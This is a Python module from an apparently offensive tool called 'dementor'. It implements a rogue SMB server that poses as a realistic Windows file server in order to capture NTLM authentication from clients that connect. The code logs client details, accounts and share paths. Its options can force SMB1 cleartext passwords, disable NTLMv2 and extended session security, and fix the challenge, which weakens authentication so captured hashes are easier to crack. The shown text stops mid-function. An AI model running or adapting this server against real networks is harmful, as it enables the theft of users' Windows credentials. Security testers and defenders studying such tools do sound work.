# Copyright (c) 2025-Present MatrixEditor
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
# pyright: basic
import uuid
import secrets
import typing

from impacket.smbserver import TypesMech, MechTypes
from scapy.fields import NetBIOSNameField
from impacket import (
    nmb,
    ntlm,
    smb,
    nt_errors,
    smb3,
    smb3structs as smb2,
    spnego,
    smbserver,
)
from caterpillar.py import (
    LittleEndian,
    f,
    struct,
    struct_factory,
    this,
    uint16,
)
from caterpillar.types import uint16_t

from dementor.config.toml import TomlConfig, Attribute as A
from dementor.config.session import SessionConfig
from dementor.config.util import get_value, is_true
from dementor.log.logger import ProtocolLogger, dm_logger
from dementor.protocols.ntlm import (
    NTLM_AUTH_CreateChallenge,
    NTLM_AUTH_format_host,
    NTLM_TRANSPORT_CLEARTEXT,
    NTLM_TRANSPORT_RAW,
    NTLM_new_timestamp,
    NTLM_report_auth,
    NTLM_report_raw_fields,
    ATTR_NTLM_CHALLENGE,
    ATTR_NTLM_DISABLE_ESS,
    ATTR_NTLM_DISABLE_NTLMV2,
    ATTR_NTLM_TARGET_TYPE,
    ATTR_NTLM_VERSION,
    ATTR_NTLM_NB_COMPUTER,
    ATTR_NTLM_NB_DOMAIN,
    ATTR_NTLM_DNS_COMPUTER,
    ATTR_NTLM_DNS_DOMAIN,
    ATTR_NTLM_DNS_TREE,
)
from dementor.protocols.spnego import (
    negTokenInit_step,
    negTokenInit,
    SPNEGO_NTLMSSP_MECH,
)
from dementor.servers import BaseProtoHandler, ThreadingTCPServer, ServerThread

# --- Constants ---------------------------------------------------------------
SMB2_DIALECTS = {
    smb2.SMB2_DIALECT_002: "SMB 2.002",
    smb2.SMB2_DIALECT_21: "SMB 2.1",
    smb2.SMB2_DIALECT_WILDCARD: "SMB 2.???",
    smb2.SMB2_DIALECT_30: "SMB 3.0",
    smb2.SMB2_DIALECT_302: "SMB 3.0.2",
    smb2.SMB2_DIALECT_311: "SMB 3.1.1",
}

SMB2_NEGOTIABLE_DIALECTS = set(SMB2_DIALECTS) - {smb2.SMB2_DIALECT_WILDCARD}

SMB2_DIALECT_REV = {v: k for k, v in SMB2_DIALECTS.items()}

# [MS-SMB2] §2.2.3.1.1: SHA-512 hash algorithm ID = 0x0001
SMB2_INTEGRITY_SHA512 = uint16.to_bytes(0x0001, order=LittleEndian)

# String-to-hex mapping for SMB2 dialect config values
SMB2_DIALECT_STRINGS: dict[str, int] = {
    "2.002": smb2.SMB2_DIALECT_002,
    "2.1": smb2.SMB2_DIALECT_21,
    "3.0": smb2.SMB2_DIALECT_30,
    "3.0.2": smb2.SMB2_DIALECT_302,
    "3.1.1": smb2.SMB2_DIALECT_311,
}

# Realistic SMB2 server values per [MS-SMB2] §2.2.4 (Windows Server defaults)
# 8 MB for direct TCP (port 445) — matches Windows Server 2012+ behaviour
SMB2_MAX_TRANSACT_SIZE: int = 8_388_608
SMB2_MAX_READ_SIZE: int = 8_388_608
SMB2_MAX_WRITE_SIZE: int = 8_388_608

# Realistic SMB2 capabilities — [MS-SMB2] §2.2.4
# DFS(0x01) | Leasing(0x02) | LargeMTU(0x04) | MultiChannel(0x08)
# | DirectoryLeasing(0x20) = 0x2f
# We do NOT set Encryption(0x40) since we don't implement it.
SMB2_SERVER_CAPABILITIES: int = 0x2F

# Realistic SMB1 negotiate defaults per [MS-CIFS] §2.2.4.52.2 / Windows 2003+
SMB1_MAX_MPX_COUNT: int = 50
SMB1_MAX_BUFFER_SIZE: int = 16644

# STATUS_ACCOUNT_DISABLED — used for multi-credential SSPI retry
STATUS_ACCOUNT_DISABLED: int = 0xC0000072


# (missing in impackets struct definitions)
# [MS-SMB2] §2.2.3.1.7 SMB2_SIGNING_CAPABILITIES
@struct(order=LittleEndian)
class SMB2SigningCapabilities(struct_factory.mixin):  # type: ignore[unsupported-base]
    SigningAlgorithmCount: uint16_t
    SigningAlgorithms: f[list[int], uint16[this.SigningAlgorithmCount]]


# --- Config helpers ----------------------------------------------------------
def _parse_dialect(value: str | int) -> int:
    """Convert a dialect string (e.g. "3.1.1") to its hex constant."""
    if isinstance(value, int):
        return value
    key = str(value).strip()
    if key not in SMB2_DIALECT_STRINGS:
        raise ValueError(
            f"Unknown SMB2 dialect {key!r}; valid: {', '.join(SMB2_DIALECT_STRINGS)}"
        )
    return SMB2_DIALECT_STRINGS[key]


# --- Config ------------------------------------------------------------------
class SMBServerConfig(TomlConfig):
    _section_ = "SMB"
    _fields_ = [
        # --- Transport & Protocol ---
        A("smb_port", "Port"),
        A("smb_enable_smb1", "EnableSMB1", True, factory=is_true),
        A("smb_enable_smb2", "EnableSMB2", True, factory=is_true),
        A("smb_allow_smb1_upgrade", "AllowSMB1Upgrade", True, factory=is_true),
        A("smb2_min_dialect", "SMB2MinDialect", "2.002", factory=_parse_dialect),
        A("smb2_max_dialect", "SMB2MaxDialect", "3.1.1", factory=_parse_dialect),
        # --- SMB Negotiate ---
        A("smb_force_smb1_plaintext", "ForceSMB1Plaintext", False, factory=is_true),
        # --- SMB Identity ---
        A("smb_nb_computer", "NetBIOSComputer", "DEMENTOR"),
        A("smb_nb_domain", "NetBIOSDomain", "WORKGROUP"),
        A("smb_server_os", "ServerOS", "Windows"),
        A("smb_native_lanman", "NativeLanMan", None),
        # --- Post-Auth ---
        A("smb_captures_per_connection", "CapturesPerConnection", 2, factory=int),
        A("smb_error_code", "ErrorCode", nt_errors.STATUS_SMB_BAD_UID),
        # --- NTLM Capture (shared, section_local=False) ---
        ATTR_NTLM_CHALLENGE,
        ATTR_NTLM_DISABLE_ESS,
        ATTR_NTLM_DISABLE_NTLMV2,
        # --- NTLM Identity (shared, section_local=False) ---
        ATTR_NTLM_TARGET_TYPE,
        ATTR_NTLM_VERSION,
        ATTR_NTLM_NB_COMPUTER,
        ATTR_NTLM_NB_DOMAIN,
        ATTR_NTLM_DNS_COMPUTER,
        ATTR_NTLM_DNS_DOMAIN,
        ATTR_NTLM_DNS_TREE,
    ]

    if typing.TYPE_CHECKING:
        smb_port: int
        smb_enable_smb1: bool
        smb_enable_smb2: bool
        smb_allow_smb1_upgrade: bool
        smb2_min_dialect: int
        smb2_max_dialect: int
        smb_force_smb1_plaintext: bool
        smb_nb_computer: str
        smb_nb_domain: str
        smb_server_os: str
        smb_native_lanman: str | None
        smb_captures_per_connection: int
        smb_error_code: int
        ntlm_challenge: bytes
        ntlm_disable_ess: bool
        ntlm_disable_ntlmv2: bool
        ntlm_target_type: str
        ntlm_version: bytes
        ntlm_nb_computer: str | None
        ntlm_nb_domain: str | None
        ntlm_dns_computer: str | None
        ntlm_dns_domain: str | None
        ntlm_dns_tree: str | None

    @property
    def effective_native_lanman(self) -> str:
        """NativeLanMan defaults to ServerOS when not explicitly set."""
        return self.smb_native_lanman or self.smb_server_os

    def set_smb_error_code(self, value: str | int) -> None:
        if isinstance(value, int):
            self.smb_error_code = value
        else:
            try:
                self.smb_error_code = getattr(nt_errors, str(value))
            except AttributeError:
                dm_logger.error(
                    f"Invalid SMB error code: {value} - using default: STATUS_SMB_BAD_UID"
                )
                self.smb_error_code = nt_errors.STATUS_SMB_BAD_UID


def apply_config(session: SessionConfig) -> None:
    session.smb_config = list(
        map(SMBServerConfig, get_value("SMB", "Server", default=[]))
    )


def create_server_threads(session: SessionConfig) -> list:
    if not session.smb_enabled:
        return []
    return [
        ServerThread(
            session,
            SMBServer,
            server_config,
            server_address=(
                session.bind_address,
                server_config.smb_port,
            ),
        )
        for server_config in session.smb_config
    ]


# --- Functions ---------------------------------------------------------------
def SMB_get_server_time() -> int:
    return NTLM_new_timestamp()


def SMB_get_command_name(command: int, smb_version: int) -> str:
    match smb_version:
        case 0x01:
            for key, value in vars(smb.SMB).items():
                if key.startswith("SMB_COM") and value == command:
                    return key

        case 0x02:
            if 0 <= command < 0x13:
                for key, value in vars(smb2).items():
                    if key.startswith("SMB2_") and value == command:
                        return key
        case _:
            pass

    return "Unknown"


# --- SMB3 --------------------------------------------------------------------
def SMB3_get_neg_context_pad(data_len: int) -> bytes:
    # [MS-SMB2] §2.2.4: padding between negotiate contexts for 8-byte alignment.
    # Spec does not mandate a pad value; Windows uses 0x00.
    return b"\x00" * ((8 - (data_len % 8)) % 8)


def SMB3_build_neg_context_list(
    context_objects: list[tuple[int, bytes]],
) -> bytes:
    context_list = b""
    for caps_type, caps in context_objects:
        context = smb3.SMB2NegotiateContext()
        context["ContextType"] = caps_type
        context["Data"] = caps
        context["DataLength"] = len(caps)

        context_list += context.getData()
        context_list += SMB3_get_neg_context_pad(context["DataLength"])
    return context_list


def SMB3_get_target_capabilities(
    handler: "SMBHandler", request: smb2.SMB2Negotiate
) -> tuple[int, ...]:
    target_cipher = smb3.SMB2_ENCRYPTION_AES128_GCM
    target_sign = 0x001  # SMB2_SIGNING_AES_CMAC
    try:
        context_data = smb3.SMB311ContextData(request["ClientStartTime"])
        context_list_offset = context_data["NegotiateContextOffset"] - 64
        assert request.rawData is not None
        raw_context_list = request.rawData[context_list_offset:]
        offset = 0
        for _ in range(context_data["NegotiateContextCount"]):
            context = smb3.SMB2NegotiateContext(raw_context_list[offset:])
            match context["ContextType"]:
                case smb3.SMB2_ENCRYPTION_CAPABILITIES:
                    req_enc_caps = smb3.SMB2EncryptionCapabilities(context["Data"])
                    target_cipher = uint16.from_bytes(
                        req_enc_caps["Ciphers"],
                        order=LittleEndian,
                    )
                case 0x008:
                    req_sign_caps = SMB2SigningCapabilities.from_bytes(context["Data"])
                    target_sign = req_sign_caps.SigningAlgorithms[0]

            offset += context["DataLength"] + 8
            offset += (8 - (offset % 8)) % 8
    except Exception as e:
        handler.logger.debug(f"Warning: invalid negotiate context list: {e}")
    return target_cipher, target_sign


# --- SMB2 --------------------------------------------------------------------
def smb2_negotiate(
    handler: "SMBHandler",
    target_revision: int,
    request: smb2.SMB2Negotiate | None = None,
) -> smb2.SMB2Negotiate_Response:
    command = smb2.SMB2Negotiate_Response()
    # [MS-SMB2] §2.2.4 / §3.3.5.4: SMB2_NEGOTIATE_SIGNING_ENABLED MUST be set
    command["SecurityMode"] = 0x01
    # [MS-SMB2] §3.3.5.4: set to the common dialect
    command["DialectRevision"] = target_revision
    # G7: stable ServerGuid per server instance — [MS-SMB2] §2.2.4
    command["ServerGuid"] = handler.server.server_guid  # type: ignore[union-attr]
    # Realistic capabilities — [MS-SMB2] §2.2.4
    command["Capabilities"] = SMB2_SERVER_CAPABILITIES
    # Realistic max sizes for direct TCP — [MS-SMB2] §2.2.4
    command["MaxTransactSize"] = SMB2_MAX_TRANSACT_SIZE
    command["MaxReadSize"] = SMB2_MAX_READ_SIZE
    command["MaxWriteSize"] = SMB2_MAX_WRITE_SIZE
    # [MS-SMB2] §2.2.4: SystemTime set to current time in FILETIME format
    command["SystemTime"] = SMB_get_server_time()
    # [MS-SMB2] §3.3.5.4: ServerStartTime SHOULD be zero <286>
    command["ServerStartTime"] = 0
    # [MS-SMB2] §2.2.4: offset from SMB2 header to Buffer (64+64=0x80)
    command["SecurityBufferOffset"] = 0x80

    # [MS-SMB2] §3.3.5.4 / [MS-SPNG] §3.2.5.2: SPNEGO negTokenInit2
    blob = negTokenInit([SPNEGO_NTLMSSP_MECH])
    command["Buffer"] = blob.getData()
    command["SecurityBufferLength"] = len(command["Buffer"])

    if target_revision == smb2.SMB2_DIALECT_311:
        # [MS-SMB2] §2.2.3.1.1 SMB2_PREAUTH_INTEGRITY_CAPABILITIES
        int_caps = smb3.SMB2PreAuthIntegrityCapabilities()
        int_caps["HashAlgorithmCount"] = 1
        int_caps["SaltLength"] = 32
        int_caps["HashAlgorithms"] = SMB2_INTEGRITY_SHA512
        int_caps["Salt"] = secrets.token_bytes(32)

        # [MS-SMB2] §2.2.3.1.2 SMB2_ENCRYPTION_CAPABILITIES
        target_cipher = smb3.SMB2_ENCRYPTION_AES128_GCM
        target_sign = 0x001  # SMB2_SIGNING_AES_CMAC
        if request:
            target_cipher, target_sign = SMB3_get_target_capabilities(handler, request)

        enc_caps = smb3.SMB2EncryptionCapabilities()
        enc_caps["CipherCount"] = 1
        enc_caps["Ciphers"] = uint16.to_bytes(target_cipher, order=LittleEndian)

        # [MS-SMB2] §2.2.3.1.7 SMB2_SIGNING_CAPABILITIES
        sign_caps = SMB2SigningCapabilities(
            SigningAlgorithmCount=1, SigningAlgorithms=[target_sign]
        )

        context_data = SMB3_build_neg_context_list(
            [
                (
                    smb3.SMB2_PREAUTH_INTEGRITY_CAPABILITIES,
                    int_caps.getData(),
                ),
                (smb3.SMB2_ENCRYPTION_CAPABILITIES, enc_caps.getData()),
                (0x0008, sign_caps.to_bytes()),
            ]
        )

        offset: int = 0x80 + command["SecurityBufferLength"]
        sec_buf_pad = SMB3_get_neg_context_pad(0x80 + command["SecurityBufferLength"])
        command["NegotiateContextOffset"] = offset + len(sec_buf_pad)
        command["NegotiateContextList"] = sec_buf_pad + context_data
        command["NegotiateContextCount"] = 3

    return command


def smb2_negotiate_protocol(handler: "SMBHandler", packet: smb2.SMB2Packet) -> None:
    req = smb3.SMB2Negotiate(data=packet["Data"])
    dialect_count: int = req["DialectCount"]
    req_raw_dialects: list[int] = req["Dialects"]
    dialect_count = min(dialect_count, len(req_raw_dialects))

    req_dialects: list[int] = req_raw_dialects[:dialect_count]
    if len(req_dialects) == 0:
        # [MS-SMB2] §3.3.5.4: DialectCount == 0 → STATUS_INVALID_PARAMETER
        handler.log_client("Client sent no dialects", "SMB2_NEGOTIATE")
        handler.logger.fail("SMB Negotiation: Client failed to provide any dialects.")
        raise BaseProtoHandler.TerminateConnection

    str_req_dialects = ", ".join([SMB2_DIALECTS.get(d, hex(d)) for d in req_dialects])
    guid = uuid.UUID(bytes_le=req["ClientGuid"])
    handler.log_client(
        f"requested dialects: {str_req_dialects} (client: {guid})",
        "SMB2_NEGOTIATE",
    )

    # G12: client info extraction — [MS-SMB2] §2.2.3
    try:
        sec_mode: int = req["SecurityMode"]
        client_caps: int = req["Capabilities"]
        handler.logger.debug(
            f"<SMB2_NEGOTIATE> Client SecurityMode=0x{sec_mode:04x} "
            f"Capabilities=0x{client_caps:08x}",
            is_client=True,
        )
    except Exception:
        handler.logger.debug(
            "Failed to extract SMB2 negotiate client info", exc_info=True
        )

    # Select greatest common dialect within configured min/max range
    cfg = handler.smb_config
    dialect = max(
        (
            d
            for d in req_dialects
            if d in SMB2_NEGOTIABLE_DIALECTS
            and cfg.smb2_min_dialect <= d <= cfg.smb2_max_dialect
        ),
        default=None,
    )
    if dialect is None:
        handler.logger.fail(f"Client requested unsupported dialects: {str_req_dialects}")
        # [MS-SMB2] §3.3.5.4: respond with STATUS_NOT_SUPPORTED
        err_resp = smb2.SMB2Negotiate_Response()
        handler.send_smb2_command(
            err_resp.getData(),
            status=nt_errors.STATUS_NOT_SUPPORTED,
            command=smb2.SMB2_NEGOTIATE,
        )
        raise BaseProtoHandler.TerminateConnection

    command = smb2_negotiate(handler, dialect, req)
    handler.log_server(
        f"selected dialect: {SMB2_DIALECTS.get(dialect, hex(dialect))}",
        "SMB2_NEGOTIATE",
    )
    handler.send_smb2_command(command.getData())


def smb2_session_setup(handler: "SMBHandler", packet: smb2.SMB2Packet) -> None:
    req = smb2.SMB2SessionSetup(data=packet["Data"])

    # G12: log PreviousSessionId — nonzero indicates reconnection
    try:
        prev_session: int = req["PreviousSessionId"]
        if prev_session:
            handler.logger.display(
                f"<SMB2_SESSION_SETUP> Reconnecting "
                f"(PreviousSessionId=0x{prev_session:016x})",
                is_client=True,
            )
    except Exception:
        handler.logger.debug("Failed to extract PreviousSessionId", exc_info=True)

    command = smb2.SMB2SessionSetup_Response()

    resp_token, error_code = handler.authenticate(
        req["Buffer"], command_name="SMB2_SESSION_SETUP"
    )
    command["SecurityBufferLength"] = len(resp_token)
    command["SecurityBufferOffset"] = 0x48
    command["Buffer"] = resp_token

    handler.send_smb2_command(
        command.getData(),
        packet,
        status=error_code,
    )


def smb2_logoff(handler: "SMBHandler", packet: smb2.SMB2Packet) -> None:
    handler.log_client("Client requested logoff", "SMB2_LOGOFF")
    handler.logger.display("Client requested logoff")

    response = smb2.SMB2Logoff_Response()
    handler.authenticated = False
    handler.send_smb2_command(
        response.getData(),
        packet,
        status=nt_errors.STATUS_SUCCESS,
    )


# --- SMB2 Tree Connect -------------------------------------------------------
def smb2_tree_connect(handler: "SMBHandler", packet: smb2.SMB2Packet) -> None:
    """Minimal SMB2 TREE_CONNECT handler — [MS-SMB2] §3.3.5.7.

    Accepts all tree connects and responds as IPC$ (pipe share).
    Logs the requested share path for intelligence gathering.
    """
    try:
        req = smb2.SMB2TreeConnect(data=packet["Data"])
        path_bytes: bytes = req["Buffer"][: req["PathLength"]]
        path = path_bytes.decode("utf-16-le", errors="replace")
        # G12: tree connect path — verbose per CLIENT_EXTRACTION.md
        handler.logger.display(
            f"<SMB2_TREE_CONNECT> Tree connect: {path}",
            is_client=True,
        )
    except Exception:
        handler.log_client("Tree connect (malformed)", "SMB2_TREE_CONNECT")

    # [MS-SMB2] §2.2.10: SMB2 TREE_CONNECT Response
    resp = smb2.SMB2TreeConnect_Response()
    resp["ShareType"] = 0x02  # [MS-SMB2] §2.2.10: SMB2_SHARE_TYPE_PIPE
    resp["ShareFlags"] = 0x00000030  # [MS-SMB2] §2.2.10: NO_CACHING
    resp["Capabilities"] = 0  # [MS-SMB2] §2.2.10: no share-level caps
    resp["MaximalAccess"] = 0x001F01FF  # [MS-DTYP] §2.4.3: FILE_ALL_ACCESS
    handler.send_smb2_command(resp.getData(), packet)


# --- SMB1 --------------------------------------------------------------------
def smb1_negotiate_protocol(handler: "SMBHandler", packet: smb.NewSMBPacket) -> None:
    resp = smb.NewSMBPacket()
    resp["Flags1"] = smb.SMB.FLAGS1_REPLY
    resp["Pid"] = packet["Pid"]
    resp["Tid"] = packet["Tid"]
    resp["Mid"] = packet["Mid"]

    req = smb.SMBCommand(packet["Data"][0])
    req_data_dialects: list[bytes] = req["Data"].split(b"\x02")[1:]
    if len(req_data_dialects) == 0:
        handler.log_client("Client sent no dialects", "SMB_COM_NEGOTIATE")
        handler.logger.fail("SMB Negotiation: Client failed to provide any dialects.")
        raise BaseProtoHandler.TerminateConnection

    dialects: list[str] = [
        dialect.rstrip(b"\x00").decode(errors="replace") for dialect in req_data_dialects
    ]
    handler.log_client(f"dialects: {', '.join(dialects)}", "SMB_COM_NEGOTIATE")

    cfg = handler.smb_config

    # Check for SMB2 dialect strings for protocol transition
    # [MS-SMB2] §3.3.5.3.1 — only when AllowSMB1Upgrade and EnableSMB2
    smb2_upgrade_target: str | None = None
    if cfg.smb_allow_smb1_upgrade and cfg.smb_enable_smb2:
        smb2_entries: dict[str, int] = {
            dialect: index
            for index, dialect in enumerate(dialects)
            if dialect in SMB2_DIALECT_REV
        }
        if smb2_entries:
            # Prefer "SMB 2.???" wildcard per [MS-SMB2] §3.3.5.3.1
            if "SMB 2.???" in smb2_entries:
                smb2_upgrade_target = "SMB 2.???"
            else:
                # Select greatest dialect by numeric value, not dict order
                smb2_upgrade_target = max(
                    smb2_entries,
                    key=lambda d: SMB2_DIALECT_REV.get(d, 0),
                )

    if smb2_upgrade_target is not None:
        command = smb2_negotiate(handler, SMB2_DIALECT_REV[smb2_upgrade_target])
        handler.log_server("Switching protocol to SMBv2", "SMB_COM_NEGOTIATE")
        handler.send_smb2_command(command.getData(), command=smb2.SMB2_NEGOTIATE)
        return

    # Find NT LM 0.12 dialect — [MS-SMB] extensions only apply to it
    nt_lm_index: int | None = None
    for i, d in enumerate(dialects):
        if d == "NT LM 0.12":
            nt_lm_index = i
            break

    if nt_lm_index is None:
        handler.logger.fail(
            "Client did not offer NT LM 0.12 dialect (and SMB2 upgrade not available)"
        )
        raise BaseProtoHandler.TerminateConnection

    # Shared negotiate parameters — [MS-CIFS] §2.2.4.52.2
    server_time = SMB_get_server_time()

    if packet["Flags2"] & smb.SMB.FLAGS2_EXTENDED_SECURITY:
        # --- Extended security path (NTLMSSP/SPNEGO) ---
        handler.smb1_extended_security = True

        # [MS-SMB] §2.2.3.1: response Flags2 for extended security negotiate
        resp["Flags2"] = (
            smb.SMB.FLAGS2_EXTENDED_SECURITY
            | smb.SMB.FLAGS2_NT_STATUS
            | smb.SMB.FLAGS2_UNICODE
            | smb.SMB.FLAGS2_LONG_NAMES
        )

        _dialects_data = smb.SMBExtended_Security_Data()
        # G7: stable ServerGuid per server instance
        _dialects_data["ServerGUID"] = handler.server.server_guid  # type: ignore[union-attr]
        blob = negTokenInit([SPNEGO_NTLMSSP_MECH])
        _dialects_data["SecurityBlob"] = blob.getData()

        _dialects_parameters = smb.SMBExtended_Security_Parameters()
        _dialects_parameters["Capabilities"] = (
            smb.SMB.CAP_EXTENDED_SECURITY
            | smb.SMB.CAP_USE_NT_ERRORS
            | smb.SMB.CAP_NT_SMBS
            | smb.SMB.CAP_UNICODE
        )
        _dialects_parameters["ChallengeLength"] = 0
    else:
        # --- Non-extended security path (raw challenge/response) ---
        # [MS-SMB] §2.2.4.5.2.2
        handler.smb1_extended_security = False
        handler.smb1_challenge = cfg.ntlm_challenge

        # [MS-SMB] §2.2.3.1: response Flags2 for non-extended security
        # NO FLAGS2_EXTENDED_SECURITY; include UNICODE + LONG_NAMES
        resp["Flags2"] = (
            smb.SMB.FLAGS2_NT_STATUS | smb.SMB.FLAGS2_UNICODE | smb.SMB.FLAGS2_LONG_NAMES
        )

        _dialects_parameters = smb.SMBNTLMDialect_Parameters()
        _dialects_data = smb.SMBNTLMDialect_Data()

        # SecurityMode — [MS-CIFS] §2.2.4.52.2
        if cfg.smb_force_smb1_plaintext:
            # Clear NEGOTIATE_ENCRYPT_PASSWORDS → plaintext passwords
            _dialects_parameters["SecurityMode"] = smb.SMB.SECURITY_SHARE_USER
            _dialects_parameters["ChallengeLength"] = 0
            handler.smb1_negotiate_encrypt = False
        else:
            _dialects_parameters["SecurityMode"] = (
                smb.SMB.SECURITY_AUTH_ENCRYPTED | smb.SMB.SECURITY_SHARE_USER
            )
            _dialects_parameters["ChallengeLength"] = 8
            _dialects_data["Challenge"] = cfg.ntlm_challenge
            handler.smb1_negotiate_encrypt = True

        # Capabilities — NO CAP_EXTENDED_SECURITY
        _dialects_parameters["Capabilities"] = (
            smb.SMB.CAP_USE_NT_ERRORS | smb.SMB.CAP_NT_SMBS | smb.SMB.CAP_UNICODE
        )

        # DomainName and ServerName — [MS-CIFS] §2.2.4.52.2
        _dialects_data["DomainName"] = smbserver.encodeSMBString(
            resp["Flags2"], cfg.smb_nb_domain
        )
        _dialects_data["ServerName"] = smbserver.encodeSMBString(
            resp["Flags2"], cfg.smb_nb_computer
        )

        # Shared parameters already set below; skip to common path
        _dialects_parameters["DialectIndex"] = nt_lm_index
        _dialects_parameters["MaxMpxCount"] = SMB1_MAX_MPX_COUNT
        _dialects_parameters["MaxNumberVcs"] = 1
        _dialects_parameters["MaxBufferSize"] = SMB1_MAX_BUFFER_SIZE
        _dialects_parameters["MaxRawSize"] = 65536
        _dialects_parameters["SessionKey"] = 0
        _dialects_parameters["LowDateTime"] = server_time & 0xFFFFFFFF
        _dialects_parameters["HighDateTime"] = (server_time >> 32) & 0xFFFFFFFF
        _dialects_parameters["ServerTimeZone"] = 0

        command = smb.SMBCommand(smb.SMB.SMB_COM_NEGOTIATE)
        command["Data"] = _dialects_data
        command["Parameters"] = _dialects_parameters

        handler.log_server(
            "selected dialect: NT LM 0.12 (non-extended)",
            "SMB_COM_NEGOTIATE",
        )
        resp.addCommand(command)
        handler.send_data(resp.getData())
        return

    # Extended security common path
    _dialects_parameters["DialectIndex"] = nt_lm_index
    _dialects_parameters["SecurityMode"] = (
        smb.SMB.SECURITY_AUTH_ENCRYPTED | smb.SMB.SECURITY_SHARE_USER
    )
    _dialects_parameters["MaxMpxCount"] = SMB1_MAX_MPX_COUNT
    _dialects_parameters["MaxNumberVcs"] = 1
    _dialects_parameters["MaxBufferSize"] = SMB1_MAX_BUFFER_SIZE
    _dialects_parameters["MaxRawSize"] = 65536
    _dialects_parameters["SessionKey"] = 0
    # Fix CRITICAL wire value: SystemTime must be current FILETIME
    _dialects_parameters["LowDateTime"] = server_time & 0xFFFFFFFF
    _dialects_parameters["HighDateTime"] = (server_time >> 32) & 0xFFFFFFFF
    _dialects_parameters["ServerTimeZone"] = 0

    command = smb.SMBCommand(smb.SMB.SMB_COM_NEGOTIATE)
    command["Data"] = _dialects_data
    command["Parameters"] = _dialects_parameters

    handler.log_server("selected dialect: NT LM 0.12", "SMB_COM_NEGOTIATE")
    resp.addCommand(command)
    handler.send_data(resp.getData())


def smb1_session_setup(handler: "SMBHandler", packet: smb.NewSMBPacket) -> None:
    command = smb.SMBCommand(packet["Data"][0])
    # [MS-SMB] §3.2.4.2.4: WordCount == 0x0C for extended security
    if command["WordCount"] == 12:
        parameters = smb.SMBSessionSetupAndX_Extended_Response_Parameters()
        data = smb.SMBSessionSetupAndX_Extended_Response_Data(flags=packet["Flags2"])

        setup_params = smb.SMBSessionSetupAndX_Extended_Parameters(command["Parameters"])
        setup_data = smb.SMBSessionSetupAndX_Extended_Data()
        setup_data["SecurityBlobLength"] = setup_params["SecurityBlobLength"]
        setup_data.fromString(command["Data"])

        # G12: extract client NativeOS and NativeLanMan
        try:
            client_os = (
                setup_data["NativeOS"]
                .decode(
                    "utf-16-le" if packet["Flags2"] & smb.SMB.FLAGS2_UNICODE else "ascii",
                    errors="replace",
                )
                .rstrip("\x00")
            )
            client_lanman = (
                setup_data["NativeLanMan"]
                .decode(
                    "utf-16-le" if packet["Flags2"] & smb.SMB.FLAGS2_UNICODE else "ascii",
                    errors="replace",
                )
                .rstrip("\x00")
            )
            if client_os or client_lanman:
                handler.logger.display(
                    f"<SMB_COM_SESSION_SETUP_ANDX> Client OS: {client_os!r} "
                    f"LanMan: {client_lanman!r}",
                    is_client=True,
                )
        except Exception:
            handler.logger.debug(
                "Failed to extract SMB1 session setup client info", exc_info=True
            )

        resp_token, error_code = handler.authenticate(
            setup_data["SecurityBlob"],
            command_name="SMB_COM_SESSION_SETUP_ANDX",
        )
        data["SecurityBlob"] = resp_token
        data["SecurityBlobLength"] = len(resp_token)
        parameters["SecurityBlobLength"] = len(resp_token)
        data["NativeOS"] = smbserver.encodeSMBString(
            packet["Flags2"],
            handler.smb_config.smb_server_os,
        )
        data["NativeLanMan"] = smbserver.encodeSMBString(
            packet["Flags2"],
            handler.smb_config.effective_native_lanman,
        )
        handler.send_smb1_command(
            smb.SMB.SMB_COM_SESSION_SETUP_ANDX,
            data,
            parameters,
            packet,
            error_code=error_code,
        )
    elif command["WordCount"] == 13:
        # Non-extended security — [MS-CIFS] §2.2.4.53.1 (G2)
        smb1_session_setup_basic(handler, packet, command)
    else:
        handler.logger.warning(
            f"<SMB_COM_SESSION_SETUP_ANDX> Unsupported WordCount: {command['WordCount']}"
        )
        raise BaseProtoHandler.TerminateConnection


def smb1_session_setup_basic(
    handler: "SMBHandler",
    packet: smb.NewSMBPacket,
    command: smb.SMBCommand,
) -> None:
    """Handle SMB1 non-extended SESSION_SETUP_ANDX (WordCount=13).

    Extracts raw LM/NT challenge-response fields or cleartext passwords
    from pre-NTLMSSP clients. Uses NTLM_report_raw_fields() for hash
    classification and capture. See G2 and G4 in IMPLEMENTATION_PLAN.md.

    Spec: [MS-CIFS] §2.2.4.53.1
    """
    cfg = handler.smb_config
    setup_params = smb.SMBSessionSetupAndX_Parameters(command["Parameters"])
    # [MS-CIFS] §2.2.4.53.1 — request data (not response)
    setup_data = smb.SMBSessionSetupAndX_Data()
    setup_data["AnsiPwdLength"] = setup_params["AnsiPwdLength"]
    setup_data["UnicodePwdLength"] = setup_params["UnicodePwdLength"]
    setup_data.fromString(command["Data"])

    oem_len: int = setup_params["AnsiPwdLength"]
    uni_len: int = setup_params["UnicodePwdLength"]
    is_unicode = bool(packet["Flags2"] & smb.SMB.FLAGS2_UNICODE)
    encoding = "utf-16-le" if is_unicode else "ascii"

    # Extract raw credential fields
    oem_pwd: bytes = setup_data["AnsiPwd"][:oem_len] if oem_len else b""
    uni_pwd: bytes = setup_data["UnicodePwd"][:uni_len] if uni_len else b""

    account: str = setup_data["Account"].decode(encoding, errors="replace").rstrip("\x00")
    domain: str = (
        setup_data["PrimaryDomain"].decode(encoding, errors="replace").rstrip("\x00")
    )

    # G12: account/domain — verbose per CLIENT_EXTRACTION.md
    handler.logger.display(
        f"<SMB_COM_SESSION_SETUP_ANDX> account={account!r} "
        f"domain={domain!r} oem_len={oem_len} uni_len={uni_len}",
        is_client=True,
    )

    # G12: extract client NativeOS and NativeLanMan
    try:
        client_os = (
            setup_data["NativeOS"].decode(encoding, errors="replace").rstrip("\x00")
        )
        client_lanman = (
            setup_data["NativeLanMan"].decode(encoding, errors="replace").rstrip("\x00")
        )
